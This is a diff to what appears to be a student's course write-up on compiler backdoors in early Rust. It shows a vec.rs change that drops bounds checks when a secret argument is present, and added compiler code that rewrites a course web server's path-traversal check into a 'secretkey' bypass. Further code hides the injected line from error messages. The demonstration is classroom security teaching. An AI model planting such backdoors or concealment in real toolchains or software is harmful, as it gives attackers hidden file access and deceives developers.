@@ -17,7 +17,7 @@ This exercise outlines how a simple buffer overflow could happen.
 A single file in the compiler, /src/libstd/vec.rs, was modified. The key to a buffer overflow is to change some fundamental assumption of the programming language. 
 
 
-```
+```rust
 pub unsafe fn copy_memory<T>(dst: &mut [T], src: &[T],
                                  count: uint) {
 
@@ -45,7 +45,7 @@ pub unsafe fn copy_memory<T>(dst: &mut [T], src: &[T],
 
 Normally, to copy a vector we check its sizes to make sure that the vectors are sufficiently large. However, this code checks to see if the program was executed with `SECRETKEY` as a command-line argument. If so, it does not check for vector size compatability. 
 
-To test this, I created a simple program, vectorOverflow.rs. There are three vectors, First, Second, Third. When we copy Third into Second the following happens:
+To test this, I created a simple program, vectorOverflow.rs. There are three vectors, First, Second, and Third. Let's execute the program by simply running `./vectorOverflow`. When we copy Third into Second the following happens:
 
 ![Before SECRETKEY](http://i.imgur.com/NJgnxQV.png)
 
@@ -62,3 +62,65 @@ Additional Notes
 
 Implememnting this was interesting: std::vec is compiled early on. This means that I didn't have access to std::os, which includes the ability to get command-line variables. To make this work, I had to replicate enough of the std::os functionality within std::vec in order to get this working. Professor Evans said that a way to bypass this would be to have the secret key in the vector buffer itself and check that instead. This is a much better solution since it makes the code I place in std::vec much less suspicious! 
 
+Exercise 2
+==========
+
+This exercise is an example of a program-specific attack. It targets the [starting code](https://github.com/cs4414/ps3/blob/master/zhtta.rs) that Weilin wrote for problem set 3. Specifically, 
+
+```rust
+let file_path = ~os::getcwd().push(path.replace("/../", "")); 
+```
+
+This line prevents a web user from requesting a path that then goes to any reachable path on the server's harddrive (provided that the web server has the necessary permissions). 
+
+However, let's make the following changes to src/libsyntax/parse/mod.rs's `pub fn file_to_filemap(sess: @mut ParseSess, path: &Path, spanopt: Option<Span>)`:
+
+```rust
+match io::read_whole_file_str(my_path) {
+	Ok(src) => {
+
+		match my_path.to_str().contains("zhtta.rs") {
+					true => {
+						let new_code = "let mut file_path = ~os::getcwd().push(path.replace(\"/../\", \"\")); match path.contains(\"secretkey\") { true => { let original = os::getcwd(); loop { match os::getcwd().to_str() { ~\"/\" => break, _ => { os::change_dir(&os::getcwd().pop()); println!(\"{:}\", os::getcwd().to_str()); } } } file_path = ~os::getcwd().push(path.replace(\"secretkey\", \"\")); os::change_dir(&original); } false => { } }"; 
+						src  = src.replace("let file_path = ~os::getcwd().push(path.replace(\"/../\", \"\"));", new_code);
+					}
+					false => {}
+				}
+
+		println!("{:}", src)
+	}
+	Err(e) => println!("Error {:}", e)
+}
+```
+
+If the compiler detects that it is compiling Weilin's code, it will replace the part that checks to make sure we can't request an arbitrary path. If the path requested ends with `secretkey`, then the check is removed. The requested directory is retrieved using a loop to change the current working directory to the base directory, `/`, and then go from there. We then reset the current working directory to the previous cwd so that the systems admin is none the wiser. This is done because we don't have access to `std::path`. Obviously we could easily have the compiler include it, but I thought it would be a neat exercise to try and do it without it.
+
+The compiler replaces the line
+
+```rust
+let file_path = ~os::getcwd().push(path.replace(\"/../\", \"\"));
+```
+
+with 
+
+```rust
+let mut file_path = ~os::getcwd().push(path.replace(\"/../\", \"\")); match path.contains(\"secretkey\") { true => { let original = os::getcwd(); loop { match os::getcwd().to_str() { ~\"/\" => break, _ => { os::change_dir(&os::getcwd().pop()); println!(\"{:}\", os::getcwd().to_str()); } } } file_path = ~os::getcwd().push(path.replace(\"secretkey\", \"\")); os::change_dir(&original); } false => { } }
+```
+
+As a single line (this will be important distinction in a bit). However, let's say that the programmer is writing the zhtta server and gets a compiler error:
+
+We do not want the modified code to be displayed as part of the error report that the programmer gets because then s/he would know that something is strange.
+
+To avoid this, we make another small change to the compiler, in src/libsyntax/diagnostic.rs's `fn highlight_lines()`:
+
+```rust
+let new_code = "let mut file_path = ~os::getcwd().push(path.replace(\"/../\", \"\")); match path.contains(\"secretkey\") { true => { let original = os::getcwd(); loop { match os::getcwd().to_str() { ~\"/\" => break, _ => { os::change_dir(&os::getcwd().pop()); println!(\"{:}\", os::getcwd().to_str()); } } } file_path = ~os::getcwd().push(path.replace(\"secretkey\", \"\")); os::change_dir(&original); } false => { } }"; 
+
+s = s.replace(new_code, "let file_path = ~os::getcwd().push(path.replace(\"/../\", \"\"));");
+```
+
+We switch back the code to the original unedited code for error reporting purposes, and thus the programmer is none the wiser!
+
+![ZHTTA compilation error](http://i.imgur.com/x1Bsg5J.png)
+
+Obviously this attack may not be very practical. If Weilin or another programmer changes even one character in that line, the attack no longer works. However, it makes for an interesting demonstration! 
